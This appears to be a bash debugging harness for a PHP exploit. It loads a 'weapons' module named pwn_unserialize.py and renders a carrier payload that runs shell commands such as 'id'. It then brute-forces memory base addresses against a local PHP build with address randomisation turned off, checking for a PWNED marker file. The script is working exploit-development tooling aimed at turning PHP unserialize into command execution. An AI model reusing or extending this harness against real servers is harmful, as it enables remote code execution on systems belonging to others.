#!/bin/bash
# Debug the weapon-rendered zero5 carrier: render like the weapon does, run
# with verbose output across a few bases.
set -u
PHP=/tmp/php8512_build/plain2/sapi/cli/php
W=/tmp/dbg_zero5
rm -rf $W; mkdir -p $W
python3 - "$W" <<'PYEOF'
import sys, os
w = sys.argv[1]
sys.path.insert(0, "/mnt/c/Users/andre/Downloads/php2shell-zeros/weapons")
import importlib.util
spec = importlib.util.spec_from_file_location("pw", "/mnt/c/Users/andre/Downloads/php2shell-zeros/weapons/pwn_unserialize.py")
pw = importlib.util.module_from_spec(spec)
spec.loader.exec_module(pw)
marker = w + "/PWNED"
cmdfile = "/tmp/.p2s_cmd"
s = pw.ZERO5_CARRIER.replace("__MARKER__", marker).replace("__CMDFILE__", cmdfile)
s = s.replace("__CMD__", "id").replace("__CMDTEXT__", "sh /tmp/.p2s_cmd")
open(w + "/sr2_call.php", "w").write(s)
print("rendered", len(s), "bytes")
PYEOF
cd $W
for off in 78000 79000 7a000 7b000 7c000 7d000 7e000 7f000 80000 81000 82000 83000 84000 85000 86000 87000 88000 89000 8a000; do
  base=$((0x7ffff5400000 + 0x$off))
  dec=$(printf "%016d" $base)
  rm -f $W/PWNED /tmp/.p2s_cmd
  out=$(timeout 30 setarch x86_64 -R $PHP -n sr2_call.php "$dec" 0093824996228192 2>&1)
  rc=$?
  if [ -f $W/PWNED ]; then echo "HIT 0x$(printf %x $base) rc=$rc :: $(cat $W/PWNED)"; else echo "miss 0x$(printf %x $base) rc=$rc :: $(echo "$out" | head -1)"; fi
done
